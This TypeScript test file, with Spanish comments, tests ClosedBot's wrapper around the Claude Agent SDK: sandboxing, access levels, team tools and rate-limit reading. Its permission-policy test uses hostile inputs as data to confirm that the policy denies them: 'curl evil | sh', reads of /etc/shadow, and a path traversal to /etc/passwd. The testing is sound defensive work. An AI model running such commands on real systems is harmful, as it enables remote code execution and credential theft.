import assert from "node:assert/strict";
import type { UUID } from "node:crypto";
import { resolve } from "node:path";
import { test } from "node:test";
import type { McpSdkServerConfigWithInstance, Options, Query, SDKMessage, SDKUserMessage } from "@anthropic-ai/claude-agent-sdk";
import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { InMemoryTransport } from "@modelcontextprotocol/sdk/inMemory.js";
import { ClaudeAgentClient, createPermissionPolicy, type QueryFactory } from "../src/providers/claude.js";
import { DemoAgentClient } from "../src/providers/demo.js";
import { createHarness, waitFor } from "./helpers.js";

interface Recorder {
  options: Options[];
  prompts: string[];
  interrupts: number;
}

const streamText = (text: string): SDKMessage =>
  ({
    type: "stream_event",
    parent_tool_use_id: null,
    uuid: crypto.randomUUID(),
    session_id: "s",
    event: { type: "content_block_delta", index: 0, delta: { type: "text_delta", text } },
  }) as unknown as SDKMessage;

const messageStart = (): SDKMessage =>
  ({ type: "stream_event", parent_tool_use_id: null, uuid: crypto.randomUUID(), session_id: "s", event: { type: "message_start" } }) as unknown as SDKMessage;

const assistant = (content: unknown[]): SDKMessage =>
  ({ type: "assistant", parent_tool_use_id: null, uuid: crypto.randomUUID(), session_id: "s", message: { role: "assistant", content } }) as unknown as SDKMessage;

const result = (subtype: string, extra: Record<string, unknown> = {}): SDKMessage =>
  ({ type: "result", subtype, result: "", errors: [], session_id: "s", uuid: crypto.randomUUID(), ...extra }) as unknown as SDKMessage;

/** Llama a una herramienta del servidor MCP del equipo como lo haría Claude. */
async function callTeamTool(options: Options, name: string, args: Record<string, unknown>): Promise<string> {
  const server = (options.mcpServers?.closedbot as McpSdkServerConfigWithInstance).instance;
  const [clientTransport, serverTransport] = InMemoryTransport.createLinkedPair();
  await server.connect(serverTransport);
  const client = new Client({ name: "prueba", version: "1.0.0" });
  await client.connect(clientTransport);
  const response = await client.callTool({ name, arguments: args });
  await client.close();
  const content = (response.content ?? []) as Array<{ type: string; text?: string }>;
  return content.map((item) => item.text ?? "").join("\n");
}

/** Nombres de las herramientas del equipo que ve el agente, como se las muestra Claude. */
async function teamToolNames(options: Options): Promise<string[]> {
  const server = (options.mcpServers?.closedbot as McpSdkServerConfigWithInstance).instance;
  const [clientTransport, serverTransport] = InMemoryTransport.createLinkedPair();
  await server.connect(serverTransport);
  const client = new Client({ name: "prueba", version: "1.0.0" });
  await client.connect(clientTransport);
  const { tools } = await client.listTools();
  await client.close();
  // Siempre cargadas: sin esto, Claude las esconde tras ToolSearch y el bot se salta list_agents.
  assert.ok(tools.every((entry) => entry._meta?.["anthropic/alwaysLoad"] === true), "herramientas del equipo siempre cargadas");
  return tools.map((entry) => entry.name).sort();
}

function fakeQueryFactory(recorder: Recorder): QueryFactory {
  return ({ prompt, options }) => {
    recorder.options.push(options);
    let interrupted = false;
    async function* run(): AsyncGenerator<SDKMessage> {
      for await (const user of prompt as AsyncIterable<SDKUserMessage>) {
        const text = typeof user.message.content === "string" ? user.message.content : "";
        recorder.prompts.push(text);
        interrupted = false;
        if (text.includes("@falla-sandbox")) {
          yield result("error_during_execution", { errors: ["sandbox unavailable: bubblewrap (bwrap) not found"] });
          continue;
        }
        yield messageStart();
        yield streamText("Hola ");
        yield streamText("desde Claude.");
        yield assistant([{ type: "text", text: "Hola desde Claude." }]);
        yield assistant([{ type: "tool_use", id: "tool-1", name: "Bash", input: { command: "ls -la" } }]);
        if (text.includes("@herramienta")) {
          const answer = await callTeamTool(options, "send_message", { to: ["Beto"], text: "¿me ayudas?" });
          yield messageStart();
          yield streamText(`Enviado: ${JSON.parse(answer).enviado}.`);
          yield assistant([{ type: "text", text: `Enviado: ${JSON.parse(answer).enviado}.` }]);
        }
        if (text.includes("@lento")) {
          for (let index = 0; index < 200 && !interrupted; index += 1) await new Promise((resolve) => setTimeout(resolve, 10));
          yield result("error_during_execution", { errors: ["Request was aborted (interrupt)"] });
          continue;
        }
        yield result("success", { result: "Hola desde Claude." });
      }
    }
    const generator = run();
    const query = Object.assign(generator, {
      interrupt: async () => {
        recorder.interrupts += 1;
        interrupted = true;
      },
      setModel: async () => undefined,
      close: () => {
        void generator.return(undefined);
      },
    });
    return query as unknown as Query;
  };
}

async function claudeHarness(platform?: NodeJS.Platform, mainAgent = false) {
  const recorder: Recorder = { options: [], prompts: [], interrupts: 0 };
  const h = await createHarness({
    createClient: (provider) =>
      provider === "claude"
        ? new ClaudeAgentClient({ createQuery: fakeQueryFactory(recorder), idleMs: 0, platform })
        : new DemoAgentClient({ wordDelayMs: 0 }),
    mainAgent,
  });
  return { h, recorder };
}

test("Claude: transmite el texto, registra herramientas y configura el modo «carpeta»", async () => {
  // El modo «carpeta» con sandbox es el de Linux y macOS; el de Windows tiene su propia prueba.
  const { h, recorder } = await claudeHarness("linux");
  try {
    const clara = h.service.createAgent({ name: "Clara", provider: "claude", model: "claude-sonnet-5-5" });
    const { message } = h.service.sendUserMessage(clara.id, "hola");
    await waitFor(() => h.store.getMessage(message.id)?.status === "completed", 5_000, "turno de Claude");
    const messages = h.service.listMessages(clara.id);
    assert.equal(messages.find((item) => item.role === "assistant")?.text, "Hola desde Claude.");
    assert.ok(messages.some((item) => item.role === "activity" && item.text === "Bash: ls -la"));
    assert.equal(recorder.prompts[0], "hola");

    const options = recorder.options[0] as Options;
    assert.equal(options.permissionMode, "acceptEdits");
    assert.deepEqual(options.settingSources, [], "en modo carpeta no se cargan ajustes que el agente pueda escribir");
    assert.equal(options.sandbox?.enabled, true);
    assert.equal(options.sandbox?.allowUnsandboxedCommands, false);
    assert.equal(options.model, "claude-sonnet-5-5");
    assert.equal(options.cwd, clara.workspace);
    assert.equal(options.sessionId, h.service.getAgent(clara.id).threadId);
    assert.equal((options.systemPrompt as { preset: string }).preset, "claude_code");
    assert.match((options.systemPrompt as { append: string }).append, /Clara/);
  } finally {
    await h.close();
  }
});

test("Claude: «Acceso total para todos» en Ajustes cambia el acceso de los agentes desde su próximo turno", async () => {
  const { h, recorder } = await claudeHarness("win32");
  try {
    const clara = h.service.createAgent({ name: "Clara", provider: "claude" });
    const turn = async (text: string) => {
      const { message } = h.service.sendUserMessage(clara.id, text);
      await waitFor(() => h.store.getMessage(message.id)?.status === "completed", 5_000, `turno «${text}»`);
      return recorder.options.at(-1) as Options;
    };
    const before = await turn("hola");
    assert.equal(before.permissionMode, "acceptEdits");
    assert.deepEqual(before.disallowedTools, ["Bash", "PowerShell", "Monitor"]);

    h.service.updateSettings({ fullAccess: true });
    const total = await turn("ahora con todo");
    assert.equal(total.permissionMode, "bypassPermissions");
    assert.equal(total.disallowedTools, undefined, "con acceso total tiene terminal");
    assert.match((total.systemPrompt as { append: string }).append, /acceso completo al equipo/);
    assert.equal(h.service.getAgent(clara.id).access, "carpeta", "el nivel propio del agente se conserva");

    h.service.updateSettings({ fullAccess: false });
    const back = await turn("otra vez solo su carpeta");
    assert.equal(back.permissionMode, "acceptEdits");
    assert.deepEqual(back.disallowedTools, ["Bash", "PowerShell", "Monitor"]);
  } finally {
    await h.close();
  }
});

test("Claude: la herramienta send_message llega al compañero", async () => {
  const { h } = await claudeHarness();
  try {
    const clara = h.service.createAgent({ name: "Clara", provider: "claude" });
    const beto = h.service.createAgent({ name: "Beto", provider: "demo" });
    const { message } = h.service.sendUserMessage(clara.id, "pide ayuda @herramienta");
    await waitFor(() => h.store.getMessage(message.id)?.status === "completed", 5_000, "turno de Claude");
    const reply = h.service.listMessages(clara.id).find((item) => item.role === "assistant");
    assert.equal(reply?.text, "Hola desde Claude.\n\nEnviado: true.");
    await waitFor(
      () => h.service.listMessages(beto.id).some((item) => item.role === "teammate" && item.text === "¿me ayudas?"),
      5_000,
      "mensaje en Beto",
    );
    await waitFor(() => h.service.listAgents().every((agent) => agent.state === "idle"), 5_000, "todos libres");
  } finally {
    await h.close();
  }
});

test("Claude: cambiar el esfuerzo reinicia la sesión reanudándola", async () => {
  const { h, recorder } = await claudeHarness();
  try {
    const clara = h.service.createAgent({ name: "Clara", provider: "claude", effort: "low" });
    const first = h.service.sendUserMessage(clara.id, "uno");
    await waitFor(() => h.store.getMessage(first.message.id)?.status === "completed", 5_000, "primer turno");
    h.service.updateAgent(clara.id, { effort: "max" });
    const second = h.service.sendUserMessage(clara.id, "dos");
    await waitFor(() => h.store.getMessage(second.message.id)?.status === "completed", 5_000, "segundo turno");
    const last = recorder.options.at(-1) as Options;
    assert.equal(last.effort, "max");
    assert.equal(last.resume, h.service.getAgent(clara.id).threadId);
  } finally {
    await h.close();
  }
});

test("Claude: detener interrumpe el turno", async () => {
  const { h, recorder } = await claudeHarness();
  try {
    const clara = h.service.createAgent({ name: "Clara", provider: "claude" });
    const { message } = h.service.sendUserMessage(clara.id, "@lento");
    await waitFor(() => h.service.getAgent(clara.id).state === "working" && recorder.prompts.length === 1, 5_000, "trabajando");
    await new Promise((resolve) => setTimeout(resolve, 30));
    await h.service.interrupt(clara.id);
    await waitFor(() => h.store.getMessage(message.id)?.status === "interrupted", 5_000, "interrumpido");
    assert.equal(recorder.interrupts, 1);
  } finally {
    await h.close();
  }
});

test("Claude: un fallo del sandbox explica cómo arreglarlo", async () => {
  const { h } = await claudeHarness();
  try {
    const clara = h.service.createAgent({ name: "Clara", provider: "claude" });
    const { message } = h.service.sendUserMessage(clara.id, "@falla-sandbox");
    await waitFor(() => h.store.getMessage(message.id)?.status === "failed", 5_000, "turno fallido");
    assert.ok(h.service.listMessages(clara.id).some((item) => item.role === "notice" && /apt install bubblewrap socat/.test(item.text)));
  } finally {
    await h.close();
  }
});

test("política de permisos por nivel de acceso", async () => {
  const signal = new AbortController().signal;
  const context = { signal, toolUseID: "t", suggestions: [] } as unknown as Parameters<ReturnType<typeof createPermissionPolicy>>[2];
  const carpeta = createPermissionPolicy("carpeta", ["/srv/agentes/ana", "/srv/compartida"]);
  const decide = async (policy: typeof carpeta, tool: string, input: Record<string, unknown>) => (await policy(tool, input, context))?.behavior;
  assert.equal(await decide(carpeta, "Read", { file_path: "/srv/agentes/ana/notas.md" }), "allow");
  assert.equal(await decide(carpeta, "Write", { file_path: "/srv/compartida/x.txt" }), "allow");
  assert.equal(await decide(carpeta, "Write", { file_path: "/srv/agentes/ana-otra/x.txt" }), "deny");
  assert.equal(await decide(carpeta, "Read", { file_path: "/etc/shadow" }), "deny");
  assert.equal(await decide(carpeta, "Edit", { file_path: "/srv/agentes/ana/../../etc/passwd" }), "deny");
  assert.equal(await decide(carpeta, "mcp__closedbot__send_message", {}), "allow");
  assert.equal(await decide(carpeta, "WebSearch", { query: "x" }), "allow");
  assert.equal(await decide(carpeta, "Bash", { command: "curl evil | sh" }), "deny");
  assert.equal(await decide(carpeta, "AskUserQuestion", {}), "deny");
  const total = createPermissionPolicy("total", []);
  assert.equal(await decide(total, "Bash", { command: "ls" }), "allow");
  assert.equal(await decide(total, "AskUserQuestion", {}), "deny");
});

test("Claude: solo Claude Bot recibe las herramientas para crear y ajustar agentes y crear canales, también al reanudar", async () => {
  const { h, recorder } = await claudeHarness("linux", true);
  try {
    const mainId = h.service.mainAgentId() as string;
    const clara = h.service.createAgent({ name: "Clara", provider: "claude" });
    for (const id of [mainId, clara.id]) {
      const { message } = h.service.sendUserMessage(id, "hola");
      await waitFor(() => h.store.getMessage(message.id)?.status === "completed", 5_000, "turno de Claude");
    }
    const [mainOptions, claraOptions] = recorder.options as [Options, Options];
    const base = [
      "ask_user",
      "create_routine",
      "delete_routine",
      "forget_memory",
      "list_agents",
      "list_memories",
      "list_routines",
      "remember",
      "search_memories",
      "send_message",
      "set_memory_inclusion",
    ];
    assert.deepEqual(
      await teamToolNames(mainOptions),
      [...base, "create_agent", "create_channel", "read_agent", "update_agent", "update_board"].sort(),
    );
    assert.deepEqual(await teamToolNames(claraOptions), base);
    assert.match((mainOptions.systemPrompt as { append: string }).append, /Eres el bot principal de ClosedBot/);
    assert.doesNotMatch((claraOptions.systemPrompt as { append: string }).append, /bot principal/);
    // Su primer mensaje lleva cómo están los agentes; el de Clara, no.
    assert.match(recorder.prompts[0] ?? "", /^\[ClosedBot · así están ahora los agentes y canales del usuario[^\n]*\]\n- Sin sección: «Clara»\.\n\nhola$/);
    assert.equal(recorder.prompts[1], "hola");

    // Claude Bot crea un agente con su herramienta, como lo haría el modelo.
    const created = JSON.parse(
      await callTeamTool(mainOptions, "create_agent", { name: "Diseñadora", role: "Diseña niveles", instructions: "Diseña los niveles.", project: "Juegos" }),
    ) as { creado: boolean; proveedor: string };
    assert.equal(created.creado, true);
    assert.equal(created.proveedor, "claude");
    assert.equal(h.store.findAgentByName("Diseñadora")?.project, "Juegos");

    // Al reanudar (aquí, por cambiar el acceso de todos) conserva sus herramientas.
    h.service.updateSettings({ fullAccess: true });
    const again = h.service.sendUserMessage(mainId, "sigue");
    await waitFor(() => h.store.getMessage(again.message.id)?.status === "completed", 5_000, "turno reanudado");
    const resumed = recorder.options.at(-1) as Options;
    assert.equal(recorder.prompts.at(-1), "sigue", "lo que creó él mismo no se le cuenta");
    assert.notEqual(resumed, mainOptions, "reinició la sesión con el acceso nuevo");
    assert.equal(resumed.permissionMode, "bypassPermissions");
    assert.ok((await teamToolNames(resumed)).includes("create_agent"));
  } finally {
    await h.close();
  }
});

test("Claude: buildOptions en acceso total", () => {
  const client = new ClaudeAgentClient({ createQuery: fakeQueryFactory({ options: [], prompts: [], interrupts: 0 }) });
  const options = client.buildOptions(
    "00000000-0000-4000-8000-000000000000" as UUID,
    { cwd: "/srv/a", developerInstructions: "x", additionalDirectories: ["/srv/a", "/srv/c"], access: "total" },
    false,
  );
  assert.equal(options.permissionMode, "bypassPermissions");
  assert.equal(options.allowDangerouslySkipPermissions, true);
  assert.equal(options.sandbox, undefined);
  assert.deepEqual(options.additionalDirectories, [resolve("/srv/c")]);
});

test("Claude: los agentes no cargan los conectores de claude.ai de la cuenta, en ningún modo", () => {
  // Aunque el entorno del servidor los pida, los agentes no deben heredar los conectores de la cuenta.
  const client = new ClaudeAgentClient({
    env: { PATH: "/usr/bin", ENABLE_CLAUDEAI_MCP_SERVERS: "true" },
    createQuery: fakeQueryFactory({ options: [], prompts: [], interrupts: 0 }),
  });
  for (const access of ["total", "carpeta"] as const) {
    const options = client.buildOptions(
      "00000000-0000-4000-8000-000000000003" as UUID,
      { cwd: "/srv/a", developerInstructions: "x", additionalDirectories: [], access },
      false,
    );
    assert.equal(options.env?.ENABLE_CLAUDEAI_MCP_SERVERS, "false", access);
    assert.deepEqual(options.settings, { disableClaudeAiConnectors: true }, access);
    assert.deepEqual(Object.keys(options.mcpServers ?? {}), ["closedbot"], access);
  }
});

test("Claude: en Windows el modo «carpeta» quita la terminal en vez de fallar", () => {
  const client = new ClaudeAgentClient({ platform: "win32", createQuery: fakeQueryFactory({ options: [], prompts: [], interrupts: 0 }) });
  const config = { cwd: "C:\\closedbot\\agentes\\ana", developerInstructions: "x", additionalDirectories: [], access: "carpeta" as const };
  const options = client.buildOptions("00000000-0000-4000-8000-000000000001" as UUID, config, false);
  assert.equal(options.sandbox, undefined);
  assert.deepEqual(options.disallowedTools, ["Bash", "PowerShell", "Monitor"]);
  assert.equal(options.permissionMode, "acceptEdits");
  assert.deepEqual(options.settingSources, []);
  assert.match((options.systemPrompt as { append: string }).append, /no puedes ejecutar comandos/);
  const total = client.buildOptions("00000000-0000-4000-8000-000000000002" as UUID, { ...config, access: "total" }, false);
  assert.equal(total.disallowedTools, undefined, "con acceso total conserva la terminal");
});

test("Claude: lee el uso del plan con una consulta corta, sin MCP ni conectores, y la cierra", async () => {
  const seen: Options[] = [];
  let closed = 0;
  let available = true;
  const client = new ClaudeAgentClient({
    idleMs: 0,
    createQuery: ({ options }) => {
      seen.push(options);
      const generator = (async function* (): AsyncGenerator<SDKMessage> {})();
      return Object.assign(generator, {
        close: () => {
          closed += 1;
        },
        usage_EXPERIMENTAL_MAY_CHANGE_DO_NOT_RELY_ON_THIS_API_YET: async () => ({
          subscription_type: "max",
          rate_limits_available: available,
          rate_limits: available
            ? {
                five_hour: { utilization: 30, resets_at: "2026-11-03T05:00:00Z" },
                seven_day: { utilization: 62, resets_at: "2026-11-05T07:00:00Z" },
                seven_day_opus: null,
                model_scoped: [{ display_name: "Fable", utilization: 12, resets_at: null }],
              }
            : null,
        }),
      }) as unknown as Query;
    },
  });
  client.start();
  try {
    const response = await client.request<{ rateLimits: unknown }>("account/rateLimits/read", {});
    assert.deepEqual(response.rateLimits, {
      available: true,
      plan: "max",
      windows: [
        { id: "seven_day", usedPercent: 62, resetsAt: "2026-11-05T07:00:00Z" },
        { id: "five_hour", usedPercent: 30, resetsAt: "2026-11-03T05:00:00Z" },
        { id: "model:Fable", label: "Semanal · Fable", usedPercent: 12, resetsAt: null },
      ],
    });
    assert.equal(seen.length, 1);
    assert.equal(seen[0]?.strictMcpConfig, true);
    assert.deepEqual(seen[0]?.mcpServers, {});
    assert.equal(seen[0]?.env?.ENABLE_CLAUDEAI_MCP_SERVERS, "false");
    assert.deepEqual(seen[0]?.settings, { disableClaudeAiConnectors: true });
    assert.equal(closed, 1, "la consulta corta se cierra");

    available = false;
    const none = await client.request<{ rateLimits: unknown }>("account/rateLimits/read", {});
    assert.deepEqual(none.rateLimits, { available: false, plan: "max", windows: [] });
  } finally {
    await client.stop();
  }
});
